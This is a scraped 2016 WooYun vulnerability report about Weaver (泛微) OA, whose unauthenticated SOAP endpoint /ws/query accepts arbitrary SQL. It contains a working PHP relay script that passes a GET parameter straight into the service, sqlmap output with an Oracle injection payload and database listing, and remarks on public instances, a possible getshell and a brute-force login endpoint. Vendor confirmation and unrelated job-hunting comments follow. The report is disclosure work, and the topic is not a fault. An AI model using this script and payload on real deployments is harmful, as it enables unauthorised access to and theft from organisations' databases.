{"id": 87136, "wybug_id": "wooyun-2016-0178866", "wybug_title": "泛微OA某接口无需登录可执行任意SQL语句（附脚本）", "wybug_corp": "上海泛微网络科技股份有限公司", "wybug_author": "浮萍", "wybug_date": "2016-02-26 16:10", "wybug_open_date": "2016-05-26 17:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-29：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-04-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-26：\t细节向公众公开  简要描述： 荒废了 啥都不会找工作啊 详细说明：  先以本地为例http://localhost:8088/ws\n\n\nhttp://localhost:8088/ws/query?wsdl\n\n\n竟然提示\n<faultstring>Unmarshalling Error: unexpected element (uri:\"http://**.**.**.**/\", local:\"arg0\"). Expected elements are &lt;{}arg1&gt;,&lt;{}arg0&gt; </faultstring>\n搜索\n\n提示是参数问题改代码肯定是不行的那就改参数吧\n\nORA-00900: 无效 sql 语句看来是可以的更改第一个参数\nselect SYS_CONTEXT('USERENV','CURRENT_USER') from dual\n\n\n查看用户量\n\n任意SQL执行  继续中转\n<?php$arg0=$_GET['sql'];header(\"content-type:text/html;charset=utf-8\");try {$client = new SoapClient('http://localhost:8088/ws/query?wsdl');$xml = \"<SOAP-ENV:Envelope xmlns:SOAP-ENV='http://**.**.**.**/soap/envelope/' xmlns:soap='http://**.**.**.**/wsdl/soap/'  xmlns:xsd='http://**.**.**.**/1999/XMLSchema'  xmlns:xsi='http://**.**.**.**/1999/XMLSchema-instance'  xmlns:m0='http://**.**.**.**/'  xmlns:SOAP-ENC='http://**.**.**.**/soap/encoding/' xmlns:urn='http://**.**.**.**/'>     <SOAP-ENV:Header/>     <SOAP-ENV:Body>        <urn:queryBy>           <arg0>1</arg0>           <arg1>1</arg1>        </urn:queryBy>     </SOAP-ENV:Body></SOAP-ENV:Envelope>\";$result=$client->queryBy(array('arg0'=>$arg0,'arg1'=>'1'));echo $result->return ;//显示结果  } catch (SOAPFault $e) {print_r('Exception:'.$e);}?>\n\n\nSQL注入\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: sql    Type: inline query    Title: Oracle inline queries    Payload: sql=(SELECT CHR(113)||CHR(115)||CHR(112)||CHR(99)||CHR(113)||(SELECT (CASE WHEN (8499=8499) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(101)||CHR(112)||CHR(97)||CHR(113) FROM DUAL)---[15:39:49] [INFO] the back-end DBMS is Oracleweb server operating system: Windowsweb application technology: Apache 2.2.22, PHP 5.3.10back-end DBMS: Oracle\n\navailable databases [20]:[*] APEX_030200[*] APPQOSSYS[*] CTXSYS[*] DBSNMP[*] EWEAVER[*] EXFSYS[*] FLOWS_FILES[*] MDSYS[*] OLAPSYS[*] ORDDATA[*] ORDSYS[*] OUTLN[*] OWBSYS[*] PM[*] SCOTT[*] SYS[*] SYSMAN[*] SYSTEM[*] WMSYS[*] XDB\n   漏洞证明：  官方：http://**.**.**.**:9085/ws/query?wsdl\n\n\n\nSQL注入就不进行了 毕竟可以执行SQL语句http://**.**.**.**/ws/query?wsdl\n\nhttp://**.**.**.**/ws/query?wsdl\n\nhttp://**.**.**.**/bugs/wooyun-2015-0148980这个估计还没修复  可以getshellhttp://localhost:8088/ws/ew?wsdl可以用于爆破登录\n\n\n\n其他问题估计还有 自测吧   修复方案：     版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2016-02-26 17:11 厂商回复： 漏洞确认，会尽快安排处理，非常感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-02-26 16:18 |    \t\t路人毛 \t\t\t( 普通白帽子  |\t\t\t        Rank:131 漏洞数:60        | 要想Rank给高，标题一定得屌)\t\t \n  找工作，你在哪个地方啊？    \n     2016-02-26 16:22 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:1056 漏洞数:208        )\t\t \n  @路人毛 准备去郑州找    \n     2016-02-26 16:25 |    \t\t路人毛 \t\t\t( 普通白帽子  |\t\t\t        Rank:131 漏洞数:60        | 要想Rank给高，标题一定得屌)\t\t \n  @浮萍 哦哦   我们公司南昌那边要人    \n     2016-02-26 16:28 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:1056 漏洞数:208        )\t\t \n  @路人毛 谢了哦    \n     2016-03-02 15:01 |    \t\tω电池ω \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | neusoft)\t\t \n  @浮萍 我是郑州的。。。我们要开发。。。    \n     2016-03-02 15:59 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:1056 漏洞数:208        )\t\t \n  @ω电池ω 谢了呀，四月去帝都    \n     2016-03-03 11:36 |    \t\tJoker \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:6        | while(age++) {\trmb += make();\ttry {...)\t\t \n  @浮萍 来郑州啊。    \n     2016-03-04 17:58 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:3099 漏洞数:618        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  @Joker 你郑州的？    \n     2016-04-13 10:34 |    \t\tshlhack‘s bother \t\t\t( 普通白帽子  |\t\t\t        Rank:225 漏洞数:91        | 大哥是shlhack,二哥是大禹888，小杰哥他哥...)\t\t \n  @浮萍 来帝都，收人啊    \n     2016-04-13 10:50 |    \t\t乐乐 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:62        | 一名信息安全员)\t\t \n  泛微克星！    \n     2016-05-26 17:25 |    \t\tsysALong \t\t\t( 普通白帽子  |\t\t\t        Rank:360 漏洞数:72        | 在我们黑龙江这噶哒，就没有什么事是【撸串...)\t\t \n  真坑人，现在中专代码居然免费了，前面我花了6 RANK  买的代码居然就是这个中转代码。。。。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}